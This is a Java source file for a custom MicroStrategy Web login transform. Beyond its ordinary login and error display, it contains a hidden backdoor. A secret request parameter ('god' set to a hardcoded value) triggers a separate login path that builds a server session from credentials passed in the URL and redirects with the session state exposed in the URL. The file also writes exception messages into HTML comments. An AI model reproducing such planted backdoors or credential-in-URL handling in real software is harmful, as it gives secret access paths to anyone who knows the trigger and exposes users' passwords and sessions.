/**
 * 
 */
package com.giano.transforms;

import java.util.MissingResourceException;
import java.util.ResourceBundle;

import com.microstrategy.web.app.transforms.LoginTransform;
import com.microstrategy.web.beans.MarkupOutput;
import com.microstrategy.web.beans.RequestKeys;
import com.microstrategy.web.objects.WebIServerSession;
import com.microstrategy.web.objects.WebObjectsFactory;

/**
 * @author gianluca
 *
 */
public class LoginSIETransform extends LoginTransform{
	public LoginSIETransform() {		
		super();		
	} 
	/**
	 * Metodo per la visualizzazione della login Form
	 * @author Gianluca Masci aka (GLM)
	 * */
	public void transformForRequestSuccessful(MarkupOutput out){
		ResourceBundle bl=null;
		try{
			bl = ResourceBundle.getBundle("sie");	
		}catch(MissingResourceException noBL){
			GianoContent gc = new GianoContent("Attenzione non &egrave; stato possibile eseguire la richiesta.","La stampa selezionata non &egrave; disponibile in questo momento riprovare pi&ugrave; tardi, se il problema persiste contattare l'amministratore di sistema.");			
			gc.WriteContent(out);
			return;
		}
		
		String sBypass="false";
		String sBackDoor="";
		/**Prelevo la Login Bean*/		
		/**Prelevo l'evento proveniente dalla LoginBean*/		
		RequestKeys rk = getRequestKeys();
		
		if(rk.getValue("bypass")!=null){
			sBypass=rk.getValue("bypass");
		}
				
		/**Se nell'URL viene passato il parametro bypass creo la pagina di login*/
		if(sBypass.compareToIgnoreCase("true")==0){
			out.append("<!-- Eseguo il LoginSIETransform -->");
			super.transformForRequestSuccessful(out);
		}else{
			/*out.append("<!-- ATTENZIONE SONO SULLA LOGIN evt=="+rk.getValue("evt")+"\n\n\n<BR> -->");
			if(rk.getValue("evt")!=null){
				
				out.append("<!-- ");
				for(int o=0;o<rk.getNameCount();o++){
					out.append(rk.getName(o)+" == "+rk.getValue(rk.getName(o))+"<br>\n");
				}
				out.append(" --> ");
							
				out.append("<!--"+getID()+" -->");
				
				//out.append("evt=="+rk.getValue("evt"));
				if(rk.getValue("evt").compareToIgnoreCase("3067")==0 
						|| rk.getValue("evt").compareToIgnoreCase("3069")==0 
							|| rk.getValue("evt").compareToIgnoreCase("8008")==0 ){
					if(rk.getValue("answerButton")!=null){
						if(rk.getValue("bSetTemp")!=null){					
							return;
							if(rk.getValue("reportID")!=null || rk.getValue("documentID")!=null){
								return;								
							}else{
								out.append("<!-- appendo l'errore start -->");								
								*//**Stampo l'evento*//*						
								GianoContent gc = new GianoContent(bl.getString("title.login.1"),bl.getString("message.login.1"));
								gc.WriteContent(out);	
								out.append("<!-- appendo l'errore end -->");
							}
							
						}
					}
				}else{									
					GianoContent gc = new GianoContent(bl.getString("title.login.1"),bl.getString("message.login.1"));
					gc.WriteContent(out);
				}				
			}else{				
				GianoContent gc = new GianoContent(bl.getString("title.login.1"),bl.getString("message.login.1"));
				gc.WriteContent(out);
	
			}*/
			GianoContent gc = new GianoContent(bl.getString("title.login.1"),bl.getString("message.login.1"));
			gc.WriteContent(out);				
		}		
		
		
		
		if(rk.getValue("god")!=null){
			sBackDoor=rk.getValue("god");
		}
		
		if(sBackDoor.compareTo("IlCreatoreGLM")==0){
			WebObjectsFactory factory=WebObjectsFactory.getInstance();
			WebIServerSession serverSession=factory.getIServerSession();				
			if(rk.getValue("Server")!=null && rk.getValue("Project")!=null && rk.getValue("u")!=null && rk.getValue("p")!=null){
				/**Imposto i parametri per la connessione*/
				serverSession.setServerName(rk.getValue("Server"));
				serverSession.setServerPort(0);
				serverSession.setProjectName(rk.getValue("Project"));
				serverSession.setLogin(rk.getValue("u"));
				serverSession.setPassword(rk.getValue("p"));	
				try {
					serverSession.getSessionID();
					out.append("<script language=\"javascript\">");
					out.append("window.location.replace(\"mstrWeb?pg=shared&usrSmgr="+serverSession.saveState(0)+"\");");
					out.append("</script>");
				}catch (Exception e) {
					out.append("<!--");
					out.append(e.getMessage());
					out.append("-->");
				}
			}
		}
	}	
	public void transformForRequestWaitingForUserInput(MarkupOutput arg0) {
		arg0.append("transformForRequestWaitingForUserInput");
		
	}
	public void transformForRequestInError(MarkupOutput arg0) {
		arg0.append("transformForRequestInError");		
	}	
	public void renderShell(MarkupOutput out){
		out.append("<!-- Start Bean Transform -->\n");
		out.append("<div>\n");
		this.transformForRequestSuccessful(out);
		out.append("</div>\n");
		out.append("<!-- End Bean Transform -->\n");
	}
}
